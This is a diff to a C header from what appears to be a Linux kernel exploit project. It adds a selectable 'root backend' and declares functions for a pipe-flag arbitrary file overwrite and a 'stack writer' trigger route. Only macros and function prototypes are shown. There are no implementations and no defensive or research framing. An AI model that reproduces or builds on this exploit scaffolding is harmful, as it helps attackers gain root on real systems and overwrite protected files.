@@ -194,6 +194,20 @@
 
 #define PAGE_PAYLOAD_FOPS 0
 #define PAGE_PAYLOAD_SLIDE 1
+#define PAGE_PAYLOAD_PIPE_FLAG 2
+
+#define ROOT_BACKEND_FOPS 1
+#define ROOT_BACKEND_PIPEFLAG 2
+#ifndef ROOT_BACKEND
+#define ROOT_BACKEND ROOT_BACKEND_FOPS
+#endif
+#if ROOT_BACKEND == ROOT_BACKEND_FOPS
+#define ROOT_BACKEND_NAME "fops"
+#elif ROOT_BACKEND == ROOT_BACKEND_PIPEFLAG
+#define ROOT_BACKEND_NAME "pipeflag"
+#else
+#error "unsupported ROOT_BACKEND"
+#endif
 
 struct kernelsnitch_shared_state;
 
@@ -386,7 +400,7 @@ void app_publish_p0_dirty(void);
 int select_slide_payload_slot(uintptr_t offset);
 int select_slide_payload_index(size_t index);
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-int app_trigger_fops_slide_route(void);
+int app_trigger_stack_writer_route(void);
 #if (defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY) || \
     (defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
      APP_FOPS_DATA_ALIAS_DIAG_ONLY)
@@ -456,6 +470,8 @@ int expand_p0_pipe_oracle(void);
 int verify_p0_pipe_oracle_gate(void);
 int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected);
 uintptr_t scan_p0_pipe_oracle(void);
+int prepare_pipe_flag_target(const char *path);
+int run_pipe_flag_overwrite(const char *path, const void *data, size_t size);
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
 uint64_t scan_p0_virtual_base_pointer(void);
 #endif
